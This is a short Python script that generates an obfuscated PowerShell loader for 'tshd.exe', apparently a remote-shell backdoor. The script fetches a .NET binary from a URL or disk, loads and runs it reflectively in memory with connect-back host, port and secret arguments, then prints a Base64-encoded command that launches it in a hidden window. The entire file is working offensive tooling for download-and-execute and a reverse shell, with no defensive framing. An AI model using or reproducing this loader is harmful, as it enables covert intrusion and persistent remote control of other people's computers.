import argparse
import base64
import os
import urllib.request
import sys

def main():
    parser = argparse.ArgumentParser(description="Generate PowerShell loader for tshd.exe")
    parser.add_argument("-c", "--host", help="Connect back host")
    parser.add_argument("-p", "--port", default="1234", help="Port")
    parser.add_argument("-s", "--secret", default="1234", help="Secret")
    parser.add_argument("-pe", "--path-exe", required=True, help="Path or URL to tshd.exe")

    args = parser.parse_args()

    # Construct arguments string
    tshd_args_list = []
    if args.host:
        tshd_args_list.extend(["-c", args.host])
    if args.port:
        tshd_args_list.extend(["-p", args.port])
    if args.secret:
        tshd_args_list.extend(["-s", args.secret])

    # PowerShell format: @('-c', '1.2.3.4', ...)
    ps_args_inner = ", ".join([f"'{x}'" for x in tshd_args_list])

    # Inner script to be executed
    # We add logic to download if URL, or read if file
    inner_script = f"""
$p = '{args.path_exe}';
if ($p -match '^http') {{
    $b = (New-Object System.Net.WebClient).DownloadData($p);
}} else {{
    $b = [System.IO.File]::ReadAllBytes($p);
}}
$a = [System.Reflection.Assembly]::Load($b);
$a.EntryPoint.Invoke($null, [object[]] @(, [string[]] @({ps_args_inner})));
"""

    print("# PowerShell Script (Debug):")
    print(inner_script)

    # Encode inner script to UTF-16LE then Base64 for -EncodedCommand
    inner_bytes = inner_script.encode('utf-16le')
    inner_b64 = base64.b64encode(inner_bytes).decode('utf-8')

    print("\n# Command to run (Background/Hidden):")
    print(f'Start-Process powershell -ArgumentList "-WindowStyle Hidden -EncodedCommand {inner_b64}"')

if __name__ == "__main__":
    main()
